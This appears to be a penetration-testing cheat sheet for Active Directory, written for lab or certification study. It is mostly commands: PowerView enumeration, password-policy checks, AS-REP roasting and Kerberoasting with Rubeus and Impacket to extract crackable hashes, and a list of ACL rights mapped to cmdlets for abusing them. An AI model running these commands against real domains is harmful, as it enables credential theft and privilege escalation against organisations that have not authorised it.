---
layout: app
title: "Active Directory Enumeration"
tags: ["PASSWD_NOTREQD","enumeration","unconstrain delegation","kerberos","Double-hop", "GPO","OU", "finduserdomain","asreproasting"]
section: "Active Directory"
---

# Create Lab

[https://jesspomfret.com/automatedlab-sql-server/](https://jesspomfret.com/automatedlab-sql-server/)

## Enable PSRemoting

```powershell
Enable-PSRemoting 
```

## Client

### Join To Domain

```powershell
Add-Computer -DomainName lab.com -Credential lab\Administrator -Force -Restart
```

### Connect to Remote Desktop

```powershell
New-PSSession -ComputerName
Start-Service WinRm
Get-Item wsman:\localhost\
Set-Item wsman:\localhost\Client\TrustedHosts -value  192.168.85.130
New-PSSession -ComputerName "IP Address"  -Credential (Get-Credential)
Enter-PSSession <Session Id>

$dc = New-PSSession -ComputerName <IP Address>  -Credential (Get-Credential)
Enter-PSSession $dc
```
# Enumeration

[PowerView Wiki](https://powersploit.readthedocs.io/en/latest/Recon/Get-Domain/)

## Password Policy

```bash
nxc smb [IP] -u [username] -p [password] --pass-pol
```

### Password Policy - from Linux - LDAP Anonymous Bind

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=domain,DC=domain" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

```bash
net accounts
```


### Error: Account is Disabled

```powershell
net use \\DC01\ipc$ "" /u:guest
System error 1331 has occurred.

This user can't sign in because this account is currently disabled.
```

### Error: Password is Incorrect

```powershell
net use \\DC01\ipc$ "password" /u:guest
System error 1326 has occurred.

The user name or password is incorrect.
```

### Error: Account is locked out (Password Policy)

```powershell
net use \\DC01\ipc$ "password" /u:guest
System error 1909 has occurred.

The referenced account is currently locked out and may not be logged on to.
```


## Passwords in Description Field 

```
(PowerView)> Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
```

```
(PowerView)> Get-Domain
(PowerView)> Get-Domain [[-Domain] <String>] [-Credential <PSCredential>]
```

# ASREPRoasting

**DONT_REQ_PREAUTH** attribute is set on user account

## Get users with DONT_REQ_PREAUTH attribute

```powershell
(PowerView)> Get-DomainUser -PreauthNotRequired | select samaccountname, userprincipalname, useraccountcontrol | fl
```
```
.\Rubeus.exe asreproast /user:<USER> /nowrap /format:hashcat
```
```bash
kerbrute userenum -d <domain> --dc <Domain IP address> <wordlists>
```
```python
Get-NPUsers.py <DOMAIN/> -dc-ip <Domain IP> -no-pass -usersfile <wordlists>
```

# Kerberoasting

## Get Kerberoastable users

```powershell
setspn.exe -Q */*
(PowerView)> Get-NetUser -SPN | select samaccountname, serviceprincipalname
.\Rubeus.exe kerberoast /stats
```
## Get TGSs for ALL kerberoastable accounts

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

(powerview)> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat
```

## Get hashes for all accounts
```powershell
.\Rubeus.exe kerberoast /simple /outfile:hashes.txt
```



# PASSWD_NOTREQD
[https://blog.icewolf.ch/archive/2011/06/08/how-to-read-the-value-of-ad-attribute-useraccountcontrol/](https://blog.icewolf.ch/archive/2011/06/08/how-to-read-the-value-of-ad-attribute-useraccountcontrol/)

```
(PowerView)> Get-DomainUser -UACFilter PASSWD_NOTREQD | select samaccountname,useraccountcontrol
```

# Double-Hob

## Detect 

```powershell
 Get-AdComputer -Filter {(TrustedForDelegation -eq $True) -And (PrimaryGroupId -eq 515)} -Properties TrustedForDelegation,TrustedForDelegation,servicePrincipalName,Description

Description          :
DistinguishedName    : CN=DESKTOP-1FEQU90,CN=Computers,DC=crtp,DC=lab
DNSHostName          : DESKTOP-1FEQU90.crtp.lab
Enabled              : True
Name                 : DESKTOP-1FEQU90
ObjectClass          : computer
ObjectGUID           : 215830a5-d4df-45c3-8af2-fc6147cb239b
SamAccountName       : DESKTOP-1FEQU90$
servicePrincipalName : {RestrictedKrbHost/DESKTOP-1FEQU90, HOST/DESKTOP-1FEQU90, RestrictedKrbHost/DESKTOP-1FEQU90.crtp.lab, HOST/DESKTOP-1FEQU90.crtp.lab}
SID                  : S-1-5-21-632435846-1015186707-1740185088-1721
**TrustedForDelegation** : True
UserPrincipalName    :

```

[https://adsecurity.org/?p=1667](https://adsecurity.org/?p=1667)

[https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)

[https://github.com/tevora-threat/SharpView/](https://github.com/tevora-threat/SharpView/)

# PowerView

[https://powersploit.readthedocs.io/en/latest/Recon](https://powersploit.readthedocs.io/en/latest/Recon/)
[https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1)
## Enumeration

### [AdModule](https://github.com/samratashok/ADModule)

```powershell
Import-Module Microsoft.ActiveDirectory.Management.dll -Verbose
Get-ADDomain
```

### Get Password Policy

```powershell
(Get-DomainPolicyData).SystemAccess

(Get-DomainPolicyData).KerberosPolicy
```

### Get Domain SID

```powershell
Get-DomainSID
```

### Users

```powershell
Get-DomainUser

Get-DomainUser -Identity [username] -Properties *

Get-DomainUser -LdapFilter "Description=*built*" | Select name,Description
```

### Get Group Names of the user
```powershell
Get-DomainGroup -UserName Administrator
```

### Computers
```powershell
Get-DomainComputer
```

### Get Groups

```powershell
Get-DomainGroup 
Get-DomainGroup *admin*
```

#### Get Members of Group

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-NetGroupMember Group | Select MemberName
```


# Find Information

> Check attacks type using BloodHound

## Find domain Admin

Finds domain machines where specific users are logged into.


```powershell
(Powerview.ps1) Find-DomainUserLocation
```

#### Find shares on hosts in current domain

```powershell
Invoke-ShareFinder –Verbose
```

#### Find sensitive files on computers in the domain

```powershell
Invoke-FileFinder –Verbose
```

#### Get all fileservers of the domain
```powershell
Get-NetFileServer
```

# GPO

```powershell
Get-DomainGPO
Get-DomainGPO -ComputerIdentity PC001
```

### Get GPO(s) which use Restricted Groups or groups.xml for interesting users

```powershell
Get-DomainGPOLocalGroup
```

### Get users which are in a local group of a machine using GPO

```powershell
Get-DomainGPOComputerLocalGroupMapping –ComputerIdentity PC01
```

### Get machines where the given user is member of a specific group

```powershell
Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
```


### Get all computers from MachineOU OU
```powershell
(Get-DomainOU -Identity MachineOU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select Name
```

## Access Control Entries (ACEs)


* **ForceChangePassword** abused with **Set-DomainUserPassword**
* **Add Members** abused with **Add-DomainGroupMember**
* **GenericAll** abused with **Set-DomainUserPassword** or **Add-DomainGroupMember**
* **GenericWrite** abused with **Set-DomainObject**
* **WriteOwner** abused with **Set-DomainObjectOwner**
* **WriteDACL** abused with **Add-DomainObjectACL**
* **AllExtendedRights** abused with **Set-DomainUserPassword** or **Add-DomainGroupMember**
* **Addself** abused with **Add-DomainGroupMember**



## ACL

### Get ACLs of an object (permissions of other objects over the indicated one)

```powershell
Get-ObjectAcl -SamAccountName <username> -ResolveGUIDs
```


```powershell
Get-DomainObjectAcl -SamAccountName "username" -ResolveGUIDS
Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins, CN=Users,DC=crtp,DC=lab" -ResolveGUIDS
```

# Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
```powershell
 Find-InterestingDomainAcl -ResolveGUIDs
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "username"}
```


# AllowReversiblePasswordEncryption 

```powershell
Get-ADUser -Filter {AllowReversiblePasswordEncryption -eq "true"} | Select Name, sAMAccountName
```

